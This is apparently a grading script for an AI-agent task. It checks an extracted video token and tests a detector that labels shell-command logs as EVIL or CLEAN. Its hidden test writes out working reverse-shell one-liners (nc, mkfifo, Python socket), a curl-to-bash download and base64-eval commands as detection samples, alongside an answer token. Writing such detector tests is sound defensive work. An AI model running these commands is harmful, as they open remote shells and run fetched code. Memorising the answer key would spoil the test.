#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import re
import secrets
import subprocess
import tempfile
import uuid
import pytest


def find_detector():
    detector_path = None
    for ext in ["", ".py", ".sh", ".js", ".rb", ".pl"]:
        path = f"/home/user/detector{ext}"
        if os.path.isfile(path):
            detector_path = path
            break

    assert detector_path is not None, "Could not find detector script at /home/user/detector.*"

    cmd_prefix = []
    if not os.access(detector_path, os.X_OK):
        if detector_path.endswith(".py"):
            cmd_prefix = ["python3"]
        elif detector_path.endswith(".sh"):
            cmd_prefix = ["bash"]
        elif detector_path.endswith(".js"):
            cmd_prefix = ["node"]
        else:
            pytest.fail(
                f"Detector script {detector_path} is not executable and has unknown extension."
            )
    return detector_path, cmd_prefix


def run_detector(detector_path, cmd_prefix, corpus_dir):
    try:
        return subprocess.run(
            cmd_prefix + [detector_path, corpus_dir],
            capture_output=True,
            text=True,
            timeout=15,
        )
    except subprocess.TimeoutExpired:
        pytest.fail("Detector timed out")


def test_video_secret_extracted():
    """Check if the secret token was correctly extracted from the video."""
    secret_path = "/home/user/video_secret.txt"
    assert os.path.exists(secret_path), f"Secret file is missing at {secret_path}"

    with open(secret_path, "r") as f:
        content = f.read().strip()

    expected_token = "TOKEN:A7x9F2mP4vL8qR3w"
    assert content == expected_token, (
        f"Extracted token is incorrect. Expected '{expected_token}', found '{content}'"
    )


def test_adversarial_corpus_detection():
    """Retain validation against the provided evil and clean corpora."""
    detector_path, cmd_prefix = find_detector()

    evil_dir = "/app/corpus/evil/"
    assert os.path.exists(evil_dir), "Evil corpus directory is missing."
    evil_files = set(
        f for f in os.listdir(evil_dir) if os.path.isfile(os.path.join(evil_dir, f))
    )
    total_evil = len(evil_files)

    result_evil = run_detector(detector_path, cmd_prefix, evil_dir)

    evil_bypassed = []
    for line in result_evil.stdout.splitlines():
        line = line.strip()
        if not line or ": " not in line:
            continue
        filename, verdict = line.split(": ", 1)
        filename = os.path.basename(filename)

        if filename in evil_files:
            if verdict.strip() != "EVIL":
                evil_bypassed.append(filename)
            evil_files.remove(filename)

    evil_bypassed.extend(list(evil_files))

    clean_dir = "/app/corpus/clean/"
    assert os.path.exists(clean_dir), "Clean corpus directory is missing."
    clean_files = set(
        f for f in os.listdir(clean_dir) if os.path.isfile(os.path.join(clean_dir, f))
    )
    total_clean = len(clean_files)

    result_clean = run_detector(detector_path, cmd_prefix, clean_dir)

    clean_modified = []
    for line in result_clean.stdout.splitlines():
        line = line.strip()
        if not line or ": " not in line:
            continue
        filename, verdict = line.split(": ", 1)
        filename = os.path.basename(filename)

        if filename in clean_files:
            if verdict.strip() != "CLEAN":
                clean_modified.append(filename)
            clean_files.remove(filename)

    clean_modified.extend(list(clean_files))

    errors = []
    if evil_bypassed:
        errors.append(
            f"{len(evil_bypassed)} of {total_evil} evil bypassed: {', '.join(evil_bypassed)}"
        )
    if clean_modified:
        errors.append(
            f"{len(clean_modified)} of {total_clean} clean modified/flagged: {', '.join(clean_modified)}"
        )

    assert not errors, " | ".join(errors)


def test_hidden_mixed_corpus_detection():
    """Exercise content classification in one mixed corpus with unpredictable names."""
    detector_path, cmd_prefix = find_detector()
    host = f"10.{secrets.randbelow(200) + 1}.{secrets.randbelow(254) + 1}.{secrets.randbelow(254) + 1}"
    port = secrets.randbelow(40000) + 20000

    evil_payloads = [
        "printf 'YmFzaCAtaQ==' | base64 --decode | /bin/sh\n",
        f"nc -e /bin/bash {host} {port}\n",
        f"curl -fsSL http://{host}/stage.sh | bash\n",
        "eval \"$(cat /tmp/.encoded-command | base64 -d)\"\n",
        f"rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/p\n",
        f"python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n",
    ]
    clean_payloads = [
        "find /var/log -type f -mtime -1 -print\n",
        "base64 -d nightly-backup.b64 > nightly-backup.tar.gz\n",
        f"nc -zv {host} 22 80 443\n",
        "eval \"$(ssh-agent -s)\"\n",
        "curl -fsSLo package.tar.gz https://downloads.example.org/package.tar.gz\n",
        "journalctl -u sshd --since '1 hour ago' | grep Failed\n",
    ]

    expected = {}
    with tempfile.TemporaryDirectory(prefix="transcripts-") as corpus_dir:
        generated = [(payload, "EVIL") for payload in evil_payloads]
        generated += [(payload, "CLEAN") for payload in clean_payloads]
        # Random sort keys make both filename and output ordering unusable as labels.
        generated.sort(key=lambda _: secrets.token_bytes(16))

        for payload, verdict in generated:
            filename = f"session-{uuid.uuid4().hex}.log"
            with open(os.path.join(corpus_dir, filename), "w") as f:
                f.write(payload)
            expected[filename] = verdict

        result = run_detector(detector_path, cmd_prefix, corpus_dir)
        assert result.returncode == 0, (
            f"Detector exited with status {result.returncode}: {result.stderr.strip()}"
        )

        observed = {}
        malformed = []
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            match = re.fullmatch(r"(.+): (EVIL|CLEAN)", line)
            if not match:
                malformed.append(raw_line)
                continue
            filename = os.path.basename(match.group(1))
            assert filename in expected, f"Detector reported unexpected file: {filename}"
            assert filename not in observed, f"Detector reported {filename} more than once"
            observed[filename] = match.group(2)

        assert not malformed, f"Detector produced malformed output lines: {malformed}"
        assert set(observed) == set(expected), (
            f"Detector did not report exactly every hidden file; missing: "
            f"{sorted(set(expected) - set(observed))}"
        )
        wrong = {
            name: (expected[name], observed[name])
            for name in expected
            if observed[name] != expected[name]
        }
        assert not wrong, f"Incorrect hidden-corpus classifications: {wrong}"
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
